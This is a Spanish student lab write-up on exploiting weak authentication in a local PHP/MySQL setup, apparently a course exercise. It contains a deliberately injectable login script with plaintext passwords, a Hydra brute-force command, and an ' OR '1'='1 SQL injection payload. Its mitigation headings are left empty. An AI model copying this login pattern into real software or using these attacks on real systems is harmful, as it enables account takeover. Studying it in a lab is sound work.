# PPS-Unidad3Actividad12-AdrianCurtoSanchez

## Creación de la Base de Datos

Acedemos a php myadmin a través de la URL http://localhost:8080/.
![alt text](images/php-myadmin-login.png)

Accedemos a la pestaña SQL donde introducimos la siguiente sentecia SQL para crear la base de datos que contendra las credenciales de acceso:
```
CREATE DATABASE SQLi;
USE SQLi;
CREATE TABLE usuarios (
	id INT AUTO_INCREMENT PRIMARY KEY,
	usuario VARCHAR(50) NOT NULL,
	contrasenya VARCHAR(100) NOT NULL
);
INSERT INTO usuarios (usuario, contrasenya) VALUES ('admin', '1234'), ('usuario', 'password');
```

![alt text](images/create-databse.png)



## Código vulnerable

Creamos el archivo login_weak.php con el siguiente contenido:
```
<?php
// creamos la conexión 
$conn = new mysqli("database", "root", "tiger", "SQLi");

if ($conn->connect_error) {
        // Excepción si nos da error de conexión
        die("Error de conexión: " . $conn->connect_error);
}
if ($_SERVER["REQUEST_METHOD"] == "POST" || $_SERVER["REQUEST_METHOD"] == "GET") {
        // Recogemos los datos pasados
        $username = $_REQUEST["username"];
        $password = $_REQUEST["password"];

        print("Usuario: " . $username . "<br>");
        print("Contraseña: " . $password . "<br>");

        // preparamos la consulta
        $query = "SELECT * FROM usuarios WHERE usuario = '$username' AND contrasenya = '$password'";
        print("Consulta SQL: " . $query . "<br>");

        //realizamos la consulta y recogemos los resultados
        $result = $conn->query($query);
        if ($result->num_rows > 0) {
        echo "Inicio de sesión exitoso";
        } else {
                echo "Usuario o contraseña incorrectos";
        }
}
$conn->close();

?>
<form method="post">
        <input type="text" name="username" placeholder="Usuario">
        <input type="password" name="password" placeholder="Contrasenya">
        <button type="submit">Iniciar Sesión</button>
</form>
```

![alt text](images/login_weak-file.png)

Accedemos a la siguiente URL http://localhost/broke_authentication/login_weak.php?username=admin&password=1234

![alt text](images/login-weak.png)

## Explotación de vulnerabilidades de Autenticación Débil

### Ataque de fuerza bruta con Hydra

Realizamos un ataque con Hydra desde Kali Linux ejecutando el siguiente comando:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/broke_authentication/login_weak.php:username=^USER^&password=^PASS^:Usuario o contraseña incorrectos"
```
![alt text](images/hydra.png)

Vemos en verde las credenciales que ha encontrado.

## Explotación de SQL Injection

Al introducir las credenciales:
```
usuario: admin
contraseña: ' OR '1'='1
```

Vemos que obtenemos las credenciales.

![alt text](images/login-weak-sqlinjection.png)


## Mitigación: Código Seguro en PHP

### Uso de contraseñas cifradas con password_hash

## Uso de consultas preparadas


## Implementar autenticación multifactor (MFA)
